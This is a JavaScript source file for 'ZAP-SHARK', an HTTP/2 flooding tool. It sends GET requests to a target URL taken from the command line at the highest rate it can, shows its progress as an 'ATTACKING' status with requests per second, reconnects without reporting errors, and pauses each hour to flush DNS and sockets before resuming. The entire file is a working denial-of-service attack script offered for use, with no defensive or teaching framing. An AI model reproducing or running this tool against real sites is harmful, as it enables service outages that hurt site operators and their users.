const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000; // 1 hour
        this.maintenanceDuration = 600000;  // 10 minutes
        
        this.client = null;
        this.attackInterval = null;
        this.isClientConnected = false;
    }

    async setupClient() {
        return new Promise((resolve) => {
            try {
                this.client = http2.connect(this.targetUrl);
                
                this.client.on('connect', () => {
                    this.isClientConnected = true;
                    resolve(true);
                });
                
                this.client.on('error', (err) => {
                    this.isClientConnected = false;
                    // Silent fail - auto reconnect
                    setTimeout(() => this.setupClient(), 1000);
                    resolve(false);
                });
                
                this.client.on('goaway', () => {
                    this.isClientConnected = false;
                    setTimeout(() => this.setupClient(), 1000);
                });
                
            } catch (err) {
                this.isClientConnected = false;
                setTimeout(() => this.setupClient(), 1000);
                resolve(false);
            }
        });
    }

    sendRequest() {
        if (!this.client || !this.isClientConnected) {
            return;
        }

        try {
            const req = this.client.request({
                ':method': 'GET',
                ':path': '/'
            });
            
            req.on('response', () => {
                // Success - destroy stream
                req.destroy();
            });
            
            req.on('error', () => {
                // Silent fail - just destroy
                req.destroy();
            });
            
            req.on('close', () => {
                // Count regardless of success/failure
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
        } catch (err) {
            // Count failed attempts too
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches || echo "DNS flush attempted"', () => {});
        }
    }

    flushSockets() {
        this.isClientConnected = false;
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
            this.client = null;
        }
        // Reconnect after flush
        setTimeout(() => this.setupClient(), 100);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n=== MAINTENANCE STARTED ===');
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            // Clear attack interval
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            // Resume after 10 minutes
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
        this.startAttack();
    }

    startAttack() {
        // Max RPS - minimal delay
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRequest();
                this.updateDisplay();
            }
        }, 0.1); // Minimal delay for max RPS
    }

    async start() {
        console.log("=== ZAP-SHARK INITIATED ===");
        console.log("Protocol: HTTP/2");
        console.log("Mode: High RPS (Pure Resources)");
        console.log("Maintenance: Auto 10min every hour");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(40));
        
        // Setup client first
        await this.setupClient();
        
        this.startAttack();
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Auto-reconnect checker
        setInterval(() => {
            if (!this.isClientConnected && this.status === "ATTACKING") {
                this.setupClient();
            }
        }, 2000);
        
        // Handle exit
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
        }
        console.log('\n=== ZAP-SHARK STOPPED ===');
        process.exit(0);
    }
}

// Usage with error handling
const target = process.argv[2] || 'https://example.com';

if (!target.startsWith('https://')) {
    console.log('Error: Target must use HTTPS for HTTP/2');
    console.log('Usage: node zap-shark.js https://your-target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(err => {
    console.log('Failed to start:', err.message);
});
